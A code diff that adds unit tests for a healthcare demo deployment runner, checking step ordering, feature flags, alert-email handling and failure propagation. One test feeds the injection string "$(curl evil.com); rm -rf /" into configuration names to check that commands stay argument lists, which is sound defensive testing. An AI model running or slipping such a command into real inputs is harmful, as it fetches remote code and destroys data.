@@ -383,5 +383,385 @@ class BundlePreparationTests(unittest.TestCase):
         self.assertIn('"ARM_TENANT_ID": cfg["expected_tenant_id"]', source)
         self.assertIn('re.sub("[^a-z0-9]", "", cfg["fabric_workspace_name"].lower())[-6:]', source)
 
+
+
+class WowDemoAddonWiringTests(unittest.IsolatedAsyncioTestCase):
+    def make_runner(self, config_updates=None):
+        runner = object.__new__(addons.AddonRunner)
+        runner.id = "test-run"
+        runner.config = {
+            "expected_tenant_id": "11111111-1111-1111-1111-111111111111",
+            "expected_subscription_id": "22222222-2222-2222-2222-222222222222",
+            "resource_group_name": "rg-test",
+            "fabric_workspace_name": "med-test",
+            "location": "eastus2",
+            "cardiology_location": "eastus2",
+            "admin_security_group": "sg-admins",
+            "databricks_environment": "prod",
+            **(config_updates or {}),
+        }
+        runner.env = {"HLS_NONINTERACTIVE": "1"}
+        runner.pids = {}
+        runner.ws = "workspace-id-123"
+        runner.phase = {"phase": "Add-on: Rayfin", "status": "running", "subSteps": []}
+        runner.deployment = {
+            "customStatus": {"subStepsByPhase": {}},
+            "output": {"phases": [runner.phase], "resources": {}},
+            "runtimeStatus": "Running",
+        }
+        runner.log = Mock()
+        runner.persist = Mock()
+        runner.resource = Mock(return_value={"name": "sttest"})
+        runner.cloud = Mock()
+        runner.cloud.items = Mock(return_value=[{"id": "g-id", "displayName": "admin-group"}])
+        runner.cloud.call = Mock(return_value={})
+        runner.run_fabric_job = AsyncMock()
+        runner.refresh_gold_sql_metadata = AsyncMock()
+        return runner
+
+    async def test_demo_step_defaults(self):
+        # Default configuration runs the safe demo steps and never the identity step
+        runner = self.make_runner()
+        runner.command = AsyncMock(return_value="")
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+
+        await runner.prepare_rayfin_imaging(root)
+
+        commands = [call.args[1] for call in runner.command.await_args_list]
+        tcga_calls = [cmd for cmd in commands if any("seed_tcga_cohort.py" in str(arg) for arg in cmd)]
+        self.assertEqual(len(tcga_calls), 1)
+        self.assertIn("apply", tcga_calls[0])
+
+        researcher_calls = [cmd for cmd in commands if any("manage_researcher_persona.py" in str(arg) for arg in cmd)]
+        self.assertEqual(len(researcher_calls), 0)
+        activator_calls = [cmd for cmd in commands if any("deploy_clinical_activator.py" in str(arg) for arg in cmd)]
+        self.assertEqual(len(activator_calls), 0)
+        trigger_calls = [cmd for cmd in commands if any("trigger_spo2_alert.py" in str(arg) for arg in cmd)]
+        self.assertEqual(len(trigger_calls), 0)
+
+        substeps = runner.phase.get("subSteps", [])
+        skipped_substep = next((s for s in substeps if s.get("status") == "skipped"), None)
+        self.assertIsNotNone(skipped_substep)
+        self.assertIn("no alert_email configured", skipped_substep.get("detail", ""))
+
+        runner_dbx = self.make_runner()
+        runner_dbx.command = AsyncMock(return_value="")
+        runner_dbx.working_copy = Mock(return_value=Path("/tmp/unused-dbx"))
+        runner_dbx.resource = Mock(return_value={"id": "fhir-id", "name": "res-name"})
+        runner_dbx.ensure_metastore = AsyncMock()
+        runner_dbx.ensure_admin_group = AsyncMock()
+        runner_dbx.ensure_onelake_databricks_storage = AsyncMock(return_value="abfss://...")
+        runner_dbx.databricks_alert_recipient = AsyncMock(return_value="")
+
+        with patch.object(addons, "az_json", side_effect=[
+            {"properties": {"exportConfiguration": {"storageAccountName": "exports"}}},
+            {"user": {"name": "deployer@example.com"}},
+        ]), \
+        patch.object(addons, "ensure_providers_registered", return_value=[]), \
+        patch.object(addons.Cloud, "items", return_value=[{"id": "g-id", "displayName": "admin-group"}]), \
+        patch.dict(sys.modules, {"yaml": Mock(safe_load=Mock(return_value={"targets": {}}), safe_dump=Mock(return_value=""))}), \
+        patch("pathlib.Path.read_text", return_value='{"workspaceUrl": {"value": "https://adb"}, "accessConnectorId": {"value": "ac"}, "managedLocationUrl": {"value": "loc"}, "dicomOutputUrl": {"value": "out"}, "warehouse_id": "wh-1"}'), \
+        patch("pathlib.Path.write_text"), patch("pathlib.Path.chmod"):
+            await runner_dbx.databricks()
+
+        dbx_commands = [call.args[1] for call in runner_dbx.command.await_args_list]
+        interop_calls = [cmd for cmd in dbx_commands if any("09-onelake-interop-proof.py" in str(arg) for arg in cmd)]
+        self.assertEqual(len(interop_calls), 1)
+        self.assertIn("--live", interop_calls[0])
+        self.assertIn("--workspace-id", interop_calls[0])
+        self.assertIn("workspace-id-123", interop_calls[0])
+    async def test_seed_tcga_cohort_invoked_in_sequence(self):
+        runner = self.make_runner({"seed_tcga_cohort": True})
+        executed_sequence = []
+
+        async def track_command(title, args, *_, **__):
+            executed_sequence.append(("command", title, args))
+            runner.substep(title, "succeeded")
+            return ""
+
+        async def track_job(item_type, item_name, job_type, *_, **__):
+            executed_sequence.append(("job", item_type, item_name, job_type))
+            return {"status": "Completed"}
+
+        async def track_sql_refresh(*_, **__):
+            executed_sequence.append(("sql_refresh",))
+
+        runner.command = AsyncMock(side_effect=track_command)
+        runner.run_fabric_job = AsyncMock(side_effect=track_job)
+        runner.refresh_gold_sql_metadata = AsyncMock(side_effect=track_sql_refresh)
+
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+        await runner.prepare_rayfin_imaging(root)
+
+        cmd_titles = [item[1] for item in executed_sequence if item[0] == "command"]
+        self.assertIn("rayfin-imaging: seed Patient 360 silos and shortcuts", cmd_titles)
+        self.assertIn("rayfin-imaging: seed TCGA synthetic FHIR cohort", cmd_titles)
+
+        p360_idx = cmd_titles.index("rayfin-imaging: seed Patient 360 silos and shortcuts")
+        tcga_idx = cmd_titles.index("rayfin-imaging: seed TCGA synthetic FHIR cohort")
+        self.assertEqual(tcga_idx, p360_idx + 1)
+
+        tcga_cmd = next(item[2] for item in executed_sequence if item[0] == "command" and item[1] == "rayfin-imaging: seed TCGA synthetic FHIR cohort")
+        self.assertTrue(any("seed_tcga_cohort.py" in str(a) for a in tcga_cmd))
+        self.assertIn("apply", tcga_cmd)
+        self.assertIn("--resource-group", tcga_cmd)
+        self.assertIn(runner.config["resource_group_name"], tcga_cmd)
+        self.assertIn("--subscription", tcga_cmd)
+        self.assertIn(runner.config["expected_subscription_id"], tcga_cmd)
+
+        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
+        self.assertEqual(substeps.get("rayfin-imaging: seed TCGA synthetic FHIR cohort"), "succeeded")
+
+        all_actions = [item[0] if item[0] != "job" else f"job:{item[2]}" for item in executed_sequence]
+        tcga_action_idx = all_actions.index("command")
+        pipe_idx = all_actions.index("job:healthcare1_msft_clinical_data_foundation_ingestion")
+        nb_idx = all_actions.index("job:materialize_reporting_tables")
+        sql_idx = all_actions.index("sql_refresh")
+        self.assertLess(tcga_action_idx, pipe_idx)
+        self.assertLess(pipe_idx, nb_idx)
+        self.assertLess(nb_idx, sql_idx)
+
+    async def test_researcher_persona_invoked_in_sequence(self):
+        runner = self.make_runner({"enable_researcher_persona": True, "seed_tcga_cohort": False, "enable_alert_stopwatch": False})
+        executed_sequence = []
+
+        async def track_command(title, args, *_, **__):
+            executed_sequence.append((title, args))
+            runner.substep(title, "succeeded")
+            return ""
+
+        runner.command = AsyncMock(side_effect=track_command)
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+        await runner.prepare_rayfin_imaging(root)
+
+        titles = [t[0] for t in executed_sequence]
+        self.assertIn("rayfin-imaging: manage researcher persona", titles)
+        self.assertIn("rayfin-imaging: seed de-identified clinical silo", titles)
+
+        persona_idx = titles.index("rayfin-imaging: manage researcher persona")
+        deid_idx = titles.index("rayfin-imaging: seed de-identified clinical silo")
+        self.assertLess(persona_idx, deid_idx)
+
+        persona_args = executed_sequence[persona_idx][1]
+        self.assertTrue(any("manage_researcher_persona.py" in str(a) for a in persona_args))
+        self.assertIn("--create", persona_args)
+        self.assertIn("--workspace-id", persona_args)
+        self.assertIn("workspace-id-123", persona_args)
+
+        deid_args = executed_sequence[deid_idx][1]
+        self.assertTrue(any("seed_deidentified_clinical.py" in str(a) for a in deid_args))
+        self.assertIn("--live", deid_args)
+        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
+        self.assertEqual(substeps.get("rayfin-imaging: manage researcher persona"), "succeeded")
+        self.assertEqual(substeps.get("rayfin-imaging: seed de-identified clinical silo"), "succeeded")
+
+    async def test_alert_stopwatch_invoked_in_sequence(self):
+        runner = self.make_runner({
+            "enable_alert_stopwatch": True,
+            "alert_email": "nurse@hospital.example",
+            "seed_tcga_cohort": False,
+            "enable_researcher_persona": False,
+        })
+        executed_sequence = []
+
+        async def track_command(title, args, *_, **kwargs):
+            executed_sequence.append((title, args, kwargs.get("env", {})))
+            runner.substep(title, "succeeded")
+            return ""
+
+        runner.command = AsyncMock(side_effect=track_command)
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+        await runner.prepare_rayfin_imaging(root)
+
+        titles = [t[0] for t in executed_sequence]
+        self.assertIn("rayfin-imaging: deploy clinical activator reflex", titles)
+        self.assertIn("rayfin-imaging: trigger SpO2 alert stopwatch", titles)
+
+        act_idx = titles.index("rayfin-imaging: deploy clinical activator reflex")
+        trig_idx = titles.index("rayfin-imaging: trigger SpO2 alert stopwatch")
+        self.assertLess(act_idx, trig_idx)
+
+        act_args, act_env = executed_sequence[act_idx][1], executed_sequence[act_idx][2]
+        self.assertTrue(any("deploy_clinical_activator.py" in str(a) for a in act_args))
+        self.assertIn("--live", act_args)
+        self.assertEqual(act_env.get("HLS_ALERT_EMAIL"), "nurse@hospital.example")
+
+        trig_args, trig_env = executed_sequence[trig_idx][1], executed_sequence[trig_idx][2]
+        self.assertTrue(any("trigger_spo2_alert.py" in str(a) for a in trig_args))
+        self.assertIn("--live", trig_args)
+        self.assertEqual(trig_env.get("HLS_ALERT_EMAIL"), "nurse@hospital.example")
+
+        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
+        self.assertEqual(substeps.get("rayfin-imaging: deploy clinical activator reflex"), "succeeded")
+        self.assertEqual(substeps.get("rayfin-imaging: trigger SpO2 alert stopwatch"), "succeeded")
+
+    async def test_databricks_interop_invoked_in_sequence(self):
+        runner = self.make_runner({"verify_databricks_interop": True})
+        executed_sequence = []
+
+        async def track_command(title, args, *_, **__):
+            executed_sequence.append((title, args))
+            runner.substep(title, "succeeded")
+            return ""
+
+        runner.command = AsyncMock(side_effect=track_command)
+        runner.working_copy = Mock(return_value=Path("/tmp/unused-dbx"))
+        runner.resource = Mock(return_value={"id": "fhir-id", "name": "res-name"})
+        runner.ensure_metastore = AsyncMock()
+        runner.ensure_admin_group = AsyncMock()
+        runner.ensure_onelake_databricks_storage = AsyncMock(return_value="abfss://...")
+        runner.databricks_alert_recipient = AsyncMock(return_value="")
+
+        with patch.object(addons, "az_json", side_effect=[
+            {"properties": {"exportConfiguration": {"storageAccountName": "exports"}}},
+            {"user": {"name": "deployer@example.com"}},
+        ]), \
+        patch.object(addons, "ensure_providers_registered", return_value=[]), \
+        patch.object(addons.Cloud, "items", return_value=[{"id": "g-id", "displayName": "admin-group"}]), \
+        patch.dict(sys.modules, {"yaml": Mock(safe_load=Mock(return_value={"targets": {}}), safe_dump=Mock(return_value=""))}), \
+        patch("pathlib.Path.read_text", return_value='{"workspaceUrl": {"value": "https://adb"}, "accessConnectorId": {"value": "ac"}, "managedLocationUrl": {"value": "loc"}, "dicomOutputUrl": {"value": "out"}, "warehouse_id": "wh-1"}'), \
+        patch("pathlib.Path.write_text"), patch("pathlib.Path.chmod"):
+            await runner.databricks()
+
+        titles = [t[0] for t in executed_sequence]
+        self.assertIn("databricks: verify OneLake Unity Catalog interop", titles)
+        interop_cmd = next(t[1] for t in executed_sequence if t[0] == "databricks: verify OneLake Unity Catalog interop")
+        self.assertTrue(any("09-onelake-interop-proof.py" in str(a) for a in interop_cmd))
+        self.assertIn("--live", interop_cmd)
+        self.assertIn("--workspace-id", interop_cmd)
+        self.assertIn("workspace-id-123", interop_cmd)
+        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
+        self.assertEqual(substeps.get("databricks: verify OneLake Unity Catalog interop"), "succeeded")
+
+    async def test_demo_step_failure_is_not_swallowed(self):
+        runner = self.make_runner({"seed_tcga_cohort": True})
+
+        async def fail_tcga(title, args, *_, **__):
+            if "seed TCGA synthetic FHIR cohort" in title:
+                runner.substep(title, "failed", f"{title} (seed_tcga_cohort.py) exited with code 1")
+                raise RuntimeError(f"{title} (seed_tcga_cohort.py) exited with code 1")
+            return ""
+
+        runner.command = AsyncMock(side_effect=fail_tcga)
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+
+        with self.assertRaises(RuntimeError) as ctx:
+            await runner.prepare_rayfin_imaging(root)
+
+        self.assertIn("seed_tcga_cohort.py", str(ctx.exception))
+        self.assertIn("exited with code 1", str(ctx.exception))
+
+        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
+        self.assertEqual(substeps.get("rayfin-imaging: seed TCGA synthetic FHIR cohort"), "failed")
+
+    async def test_idempotent_rerun_succeeds(self):
+        runner = self.make_runner({
+            "seed_tcga_cohort": True,
+            "enable_researcher_persona": True,
+            "enable_alert_stopwatch": True,
+            "alert_email": "nurse@hospital.example",
+        })
+        runner.command = AsyncMock(return_value="")
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+
+        await runner.prepare_rayfin_imaging(root)
+        count_run_1 = runner.command.await_count
+
+        await runner.prepare_rayfin_imaging(root)
+        count_run_2 = runner.command.await_count
+
+        self.assertEqual(count_run_2, count_run_1 * 2)
+
+    async def test_command_injection_rejected(self):
+        malicious_input = "$(curl evil.com); rm -rf /"
+        runner = self.make_runner({
+            "fabric_workspace_name": malicious_input,
+            "resource_group_name": malicious_input,
+            "seed_tcga_cohort": True,
+        })
+        captured_args = []
+
+        async def capture_exec(title, args, *_, **__):
+            captured_args.append(args)
+            return ""
+
+        runner.command = AsyncMock(side_effect=capture_exec)
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+        await runner.prepare_rayfin_imaging(root)
+
+        for cmd in captured_args:
+            self.assertIsInstance(cmd, list)
+            if malicious_input in cmd:
+                self.assertIn(malicious_input, cmd)
+
+    async def test_identity_creation_blocked_by_default(self):
+        for flag_val in (None, False, "false", "False", "no", "0"):
+            config = {"seed_tcga_cohort": False, "enable_alert_stopwatch": False}
+            if flag_val is not None:
+                config["enable_researcher_persona"] = flag_val
+            runner = self.make_runner(config)
+            runner.command = AsyncMock(return_value="")
+            root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+            await runner.prepare_rayfin_imaging(root)
+
+            commands = [call.args[1] for call in runner.command.await_args_list]
+            persona_calls = [cmd for cmd in commands if any("manage_researcher_persona.py" in str(arg) for arg in cmd)]
+            self.assertEqual(len(persona_calls), 0, f"Expected 0 calls for flag_val={flag_val}")
+
+    async def test_email_dispatch_requires_alert_email(self):
+        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
+
+        for empty_email in ("", None):
+            runner = self.make_runner({"alert_email": empty_email, "seed_tcga_cohort": False})
+            runner.command = AsyncMock(return_value="")
+            await runner.prepare_rayfin_imaging(root)
+
+            commands = [call.args[1] for call in runner.command.await_args_list]
+            alert_calls = [cmd for cmd in commands if any("deploy_clinical_activator.py" in str(a) or "trigger_spo2_alert.py" in str(a) for a in cmd)]
+            self.assertEqual(len(alert_calls), 0)
+
+        runner = self.make_runner({"alert_email": "nurse@hospital.example", "seed_tcga_cohort": False})
+        captured = []
+        async def record_cmd(title, args, *_, **kwargs):
+            captured.append((title, args, kwargs.get("env", {})))
+            return ""
+        runner.command = AsyncMock(side_effect=record_cmd)
+        await runner.prepare_rayfin_imaging(root)
+
+        activator_call = next((c for c in captured if any("deploy_clinical_activator.py" in str(a) for a in c[1])), None)
+        trigger_call = next((c for c in captured if any("trigger_spo2_alert.py" in str(a) for a in c[1])), None)
+        self.assertIsNotNone(activator_call)
+        self.assertIsNotNone(trigger_call)
+        self.assertEqual(activator_call[2].get("HLS_ALERT_EMAIL"), "nurse@hospital.example")
+        self.assertEqual(trigger_call[2].get("HLS_ALERT_EMAIL"), "nurse@hospital.example")
+
+        runner_disabled = self.make_runner({"alert_email": "nurse@hospital.example", "enable_alert_stopwatch": False, "seed_tcga_cohort": False})
+        runner_disabled.command = AsyncMock(return_value="")
+        await runner_disabled.prepare_rayfin_imaging(root)
+        dis_commands = [call.args[1] for call in runner_disabled.command.await_args_list]
+        dis_alert_calls = [cmd for cmd in dis_commands if any("deploy_clinical_activator.py" in str(a) or "trigger_spo2_alert.py" in str(a) for a in cmd)]
+        self.assertEqual(len(dis_alert_calls), 0)
+
+        for title, args, _ in captured:
+            self.assertNotIn("nurse@hospital.example", title)
+            for a in args:
+                self.assertNotIn("nurse@hospital.example", str(a))
+
+    async def test_missing_cli_script_file_raises(self):
+        runner = self.make_runner()
+        nonexistent = "/tmp/nonexistent_script_xyz_123.py"
+        with self.assertRaises(FileNotFoundError) as ctx:
+            await runner.command("test missing script", [sys.executable, nonexistent])
+        self.assertIn("Script file not found", str(ctx.exception))
+        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
+        self.assertEqual(substeps.get("test missing script"), "failed")
+
+    def test_emulator_device_count_alignment(self):
+        deploy_ps1 = (addons.ROOT / "phase-1/deploy.ps1").read_text(encoding="utf-8")
+        deploy_all_ps1 = (addons.ROOT / "Deploy-All.ps1").read_text(encoding="utf-8")
+        self.assertIn("elseif ($SeedTcgaCohort) { 115 } else { 100 }", deploy_ps1)
+        self.assertIn("elseif ($SeedTcgaCohort) { 115 } else { 100 }", deploy_all_ps1)
+        self.assertIn('"deviceCount=$effectiveDeviceCount"', deploy_ps1)
+        self.assertIn("$deployArgs['DeviceCount'] = $effectiveDeviceCount", deploy_all_ps1)
 if __name__ == "__main__":
     unittest.main()
